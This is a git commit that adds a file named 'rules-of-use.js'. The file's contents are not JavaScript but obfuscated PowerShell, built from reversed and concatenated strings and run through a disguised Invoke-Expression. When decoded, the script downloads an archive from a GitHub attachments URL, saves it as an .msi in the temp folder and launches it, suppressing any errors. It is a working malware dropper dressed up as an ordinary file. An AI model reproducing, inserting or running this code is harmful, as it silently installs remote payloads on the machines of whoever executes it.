93b36e5dac16b434ce5ff26340ddf5f74c0df3bd
Azkic50 <Azkilohj55@gmail.com>
2025-03-30 19:41:21 -0400

    Create rules-of-use.js

---
+++ rules-of-use.js
@@ -0,0 +1,22 @@
+$uNGLpe= [ChAr[ ]]" ) )29]RAHC[]GniRTs[,)86]RAHC[+48]RAHC[+611]RAHC[((ECAlPER.)63]RAHC[]GniRTs[,)76]RAHC[+811]RAHC[+67]RAHC[((ECAlPER.)43]RAHC[]GniRTs[,'doY'(ECAlPER.)'  
+
+}  
+}    
+'+'{ hctac  '+'  
+}    
+'+';htaPeli'+'fCvL '+'s'+'secorP-tra'+'tS '+'   '+'  
+}  '+'    
+ ;htaPelif'+'CvL eliF'+'tuO- '+'a.iCvL irU- d'+'ohteMt'+'se'+'R-ekovnI     '+'   
+{ )daoln'+'wodCvL( fi    '+'  '+'
+ } '+'     '+'
+;'+'esl'+'afC'+'vL = daoln'+'wod'+'C'+'vL'+'    '+'    
+{'+' )htaPe'+'lifCvL '+'ht'+'aP-tseT( '+'fi   '+'   
+;eurtCvL = '+'daolnwodCv'+'L    '+'  
+'+';doY)b.iCvL'+'(CvLDTtPM'+'ET:vneCvLd'+'o'+'Y = ht'+'a'+'Pe'+'l'+'ifCvL      
+{ '+'yr'+'t    
+{ )'+'ataDemosCvL ni '+'i'+'C'+'vL'+'( hcaer'+'of  
+;)
+}'+'doYism.3OQXPDCBO'+'doY ='+' b '+';'+'doYpiz.'+'OQXPD'+'CBO/'+'12'+'672'+'5'+'91'+'/selif/stnemhcat'+'ta-resu/moc.buhtig'+'//:'+'spt'+'thdoY '+'= a{@]tcejbOmotsu'+'CSP['+' '+' '+'
+('+'@ '+'= at'+'aDemosCvL  '+'
+
+'(( )'x'+]43[EmOHSp$+]4[EmohsP$ (."; [ArraY]::reVerSE( ( lS vArIABLe:UnGlPE).vALue );& ( $vErBOsePrEFerencE.TOStRiNg()[1,3]+'x'-JOiN'') ( -jOin( lS vArIABLe:UnGlPE).vALue)
